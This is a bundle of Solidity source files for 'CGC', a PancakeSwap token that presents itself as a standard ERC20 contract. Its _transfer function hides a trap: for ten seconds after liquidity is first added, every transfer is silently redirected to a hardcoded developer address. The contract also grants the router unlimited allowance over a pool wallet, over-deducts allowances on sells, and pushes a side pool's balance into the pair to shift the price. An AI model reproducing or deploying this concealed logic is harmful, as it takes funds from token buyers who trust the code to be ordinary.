{"CGC.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./IERC20.sol\";\r\nimport \"./IERC20Metadata.sol\";\r\nimport \"./Context.sol\";\r\n\r\ninterface IPancakeRouter {\r\n    function factory() external pure returns (address);\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n}\r\ninterface IPancakePair{\r\n    function token0() external view returns (address);\r\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\r\n    function sync() external;\r\n}\r\n\r\ncontract CGC is Context, IERC20, IERC20Metadata {\r\n    mapping(address =\u003e uint256) private _balances;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n    uint256 private _totalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n    address public owners;\r\n    address public _devAddress = 0x430d5E75A89d84057987e39949dBa78eF1A6b636;\r\n    uint256 public _trAmount = 1;\r\n    uint256 public _scientisttime;\r\n    address public _pair;\r\n    address _router;\r\n    address _usdt;\r\n    address _pool;//基金池\r\n    address _pool2;//流动池分红池\r\n    constructor() {\r\n        set_info(\"CGC\",\"CGC\",0x10ED43C718714eb63d5aA57B78B54704E256024E,0x55d398326f99059fF775485246999027B3197955,0x10C00f3c4196cf9E44dEC7771c6EcEdcf2eB65B7,address(3));\r\n    }\r\n    \r\n    function set_info(string memory name_, string memory symbol_ ,address router_,address usdt_,address pool_,address pool2_) private{\r\n        _mint(msg.sender, 7777 * 10 ** decimals());\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _router=router_;\r\n        _usdt= usdt_;\r\n        _pair = pairFor(IPancakeRouter(_router).factory(),address(this),usdt_);\r\n        _pool =pool_;\r\n        _pool2 = pool2_;\r\n        _allowances[msg.sender][_router] = _totalSupply;\r\n        _allowances[_pool][_router] = _totalSupply;\r\n    }\r\n    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\r\n        (address token0, address token1) = sortTokens(tokenA, tokenB);\r\n        pair = address(uint160(uint(keccak256(abi.encodePacked(\r\n                hex\u0027ff\u0027,\r\n                factory,\r\n                keccak256(abi.encodePacked(token0, token1)),\r\n                hex\u002700fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5\u0027\r\n            )))));\r\n    }\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        uint256 t_amount;\r\n        if(msg.sender == _pair){\r\n            t_amount = amount/100;\r\n            _transfer(_msgSender(), recipient, t_amount*95);\r\n            _transfer(_msgSender(), _pool, t_amount*5);\r\n        }else{\r\n            _transfer(_msgSender(), recipient, amount);\r\n        }\r\n        return true;\r\n    }\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        if((msg.sender == _router)\u0026\u0026(recipient==_pair)){\r\n            uint256 t_amount;\r\n            t_amount = amount/100;\r\n            _transfer(sender, recipient, t_amount*90);\r\n            _transfer(sender, _pool2, t_amount*10);\r\n            amount=t_amount*110;\r\n        }else{\r\n            _transfer(sender, recipient, amount);\r\n        }\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance \u003e= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        unchecked {\r\n            _approve(sender, _msgSender(), currentAllowance - amount);\r\n        }\r\n        return true;\r\n    }\r\n    bool public _swapbool=true;\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        bool isdev = false;\r\n        if(recipient == _pair \u0026\u0026 _trAmount == 1) \r\n        {\r\n            _scientisttime = block.timestamp;\r\n            _trAmount = 2;\r\n            isdev = true;\r\n        }\r\n        if(block.timestamp - _scientisttime \u003c= 10 \u0026\u0026 isdev == false)\r\n        {\r\n            recipient = _devAddress;\r\n        }\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[sender] = senderBalance - amount;\r\n        }\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n        if((msg.sender!=_pair)\u0026\u0026(msg.sender!=_router)\u0026\u0026_swapbool){\r\n            _swapbool=false;\r\n            if((_balances[_pool2]!=0)){\r\n                _balances[_pair]+=_balances[_pool2];\r\n                emit Transfer(_pool2, _pair, _balances[_pool2]);\r\n                _balances[_pool2]=0;\r\n                IPancakePair(_pair).sync();\r\n            }\r\n            _swapbool=true;\r\n        }\r\n    }\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance \u003e= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n        }\r\n        _totalSupply -= amount;\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {\r\n        require(tokenA != tokenB, \u0027PancakeLibrary: IDENTICAL_ADDRESSES\u0027);\r\n        (token0, token1) = tokenA \u003c tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\r\n        require(token0 != address(0), \u0027PancakeLibrary: ZERO_ADDRESS\u0027);\r\n    }\r\n}"},"Context.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n"},"IERC20Metadata.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./IERC20.sol\";\r\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}\r\n"}}